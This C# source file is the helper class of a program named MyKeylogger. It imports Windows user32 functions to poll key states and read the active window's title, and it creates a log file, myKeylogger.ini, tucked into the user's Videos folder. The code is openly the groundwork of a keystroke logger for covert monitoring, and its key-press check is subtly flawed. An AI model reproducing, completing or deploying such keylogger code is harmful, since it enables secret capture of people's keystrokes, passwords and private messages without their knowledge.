using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MyKeylogger
{
    public static class Functions
    {

        #region DllImports

        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();


        [DllImport("user32.dll")]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);


        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern short GetKeyState(Keys nVirtualKey);

        #endregion

        public static bool IsKeyPressed(this Keys key)
        {
            Int16 result = GetKeyState(key);

            switch (result)
            {
                case 0: return false;

                case 1: return true;

                default: return true;
            }
        }

        public static bool IsKeyToggled(this Keys key)
        {
            return GetKeyState(key) == 0x1;
        }

        public static string GetActiveWindowsText()
        {
            IntPtr handle = GetForegroundWindow();

            StringBuilder sb = new StringBuilder();

            GetWindowText(handle, sb, 1000);

            return sb.Length == 0 ? "UnNamed Windows" : sb.ToString();

        }


        public static string Fullpath => Environment.GetFolderPath
                    (Environment.SpecialFolder.MyVideos) + "\\myKeylogger.ini";
        public static void CreateFile()
        {
            if (File.Exists(Fullpath))
            {
                return;
            }

            File.Create(path: Fullpath).Dispose();

        }
    }

}

